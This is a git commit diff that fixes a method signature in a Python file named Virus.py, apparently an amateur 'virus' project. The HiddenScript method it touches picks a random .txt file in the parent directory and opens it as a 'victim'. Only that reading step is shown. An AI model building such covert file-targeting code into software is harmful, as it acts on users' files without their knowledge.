2a3a581bb61ce5087a0853479f366693fb128269
techieji <drpradhyum2016@outlook.com>
2020-03-12 18:41:07 -0400

    Fixed an error

--- Virus.py
+++ Virus.py
@@ -3,7 +3,7 @@ import Tree
 from random import choice
 
 class Virus:
-    def HiddenScript():
+    def HiddenScript(self):
         filepath = os.getcwd() #note to self: this is how you get a file's location (most of the time, at least)
         t = Tree(os.path.dirname(filepath))
         victim = open(os.path.dirname(filepath) + "\\" + choice(t.searchExtension(".txt")), mode='r')
